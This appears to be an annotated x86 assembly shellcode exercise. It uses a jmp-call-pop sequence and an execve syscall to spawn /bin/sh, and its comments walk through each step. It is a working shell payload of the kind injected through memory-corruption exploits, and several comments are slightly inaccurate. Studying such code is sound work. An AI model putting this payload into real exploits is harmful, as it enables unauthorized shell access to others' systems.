; xor.nasm
; Author: Ryan 

global _start

section .text
; order of execution will be numbered
; 1. finds _start and enters here
_start:
	; 2. calls jmp short jmp_code - avoids using null characters to get to a label
	jmp short jmp_code

dostuff:

	xor eax, eax ; 4. clear eax for pushing the needed system call for execve
	mov al, 0xb ; 5. push 0xb to the al register - system call for 
	
	pop ebx ; 6. ebx now will hold the address of jmp_code (where /bin/sh starts) - dyanmically found

	; 7. clear ecx/edx 
	xor ecx, ecx
	xor edx, edx

	; 8. Interrupt 80 hex - invoke syscall
	int 0x80 
	; 9. You have a shell!  whoooo


jmp_code:
	; 3. calls do stuff and in doing so pushes the address of jmp_code to the stack
	call dostuff ; using the stack for jmp_code address allows for dynamic addresses
	shell: db '/bin/sh',0x0